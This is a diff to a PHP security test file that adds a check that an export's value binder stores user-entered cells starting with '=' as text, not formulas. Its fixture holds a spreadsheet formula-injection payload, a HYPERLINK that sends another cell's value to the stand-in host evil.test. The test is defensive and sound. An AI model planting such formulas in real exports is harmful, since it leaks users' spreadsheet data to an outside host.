@@ -11,7 +11,9 @@ use Illuminate\Translation\Translator;
 use Innoboxrr\LarapackGenerator\Tests\Support\FakeProject;
 use Innoboxrr\LarapackGenerator\Tests\TestCase;
 use PhpOffice\PhpSpreadsheet\Cell\Cell;
+use PhpOffice\PhpSpreadsheet\Cell\DataType;
 use PhpOffice\PhpSpreadsheet\Cell\DefaultValueBinder;
+use PhpOffice\PhpSpreadsheet\Reader\Html;
 use Symfony\Component\Console\Command\Command;
 
 /**
@@ -145,6 +147,27 @@ final class GeneratedSecurityTest extends TestCase
 
         $this->assertSame('https://interno/1', $payload['internal_url']);
         $this->assertArrayNotHasKey('otra', $payload);
+    }
+
+    // EXPORT: LO QUE ESCRIBIÓ UN USUARIO NO SE CONVIERTE EN FÓRMULA
+
+    public function test_la_exportacion_guarda_como_texto_lo_que_empieza_por_igual(): void
+    {
+        $class = 'Acme\\Vault\\Exports\\DocumentsExports';
+
+        Cell::setValueBinder(new $class([]));
+
+        $sheet = (new Html)->loadFromString(
+            '<table><tr><td>=HYPERLINK("https://evil.test/?d="&amp;B1,"Ver")</td><td>=1+1</td><td>42</td><td>texto</td></tr></table>'
+        )->getActiveSheet();
+
+        $this->assertSame(DataType::TYPE_STRING, $sheet->getCell('A1')->getDataType());
+        $this->assertSame('=HYPERLINK("https://evil.test/?d="&B1,"Ver")', $sheet->getCell('A1')->getValue());
+        $this->assertSame(DataType::TYPE_STRING, $sheet->getCell('B1')->getDataType());
+
+        // El resto se tipa como siempre.
+        $this->assertSame(DataType::TYPE_NUMERIC, $sheet->getCell('C1')->getDataType());
+        $this->assertSame(DataType::TYPE_STRING, $sheet->getCell('D1')->getDataType());
     }
 
     // AYUDAS
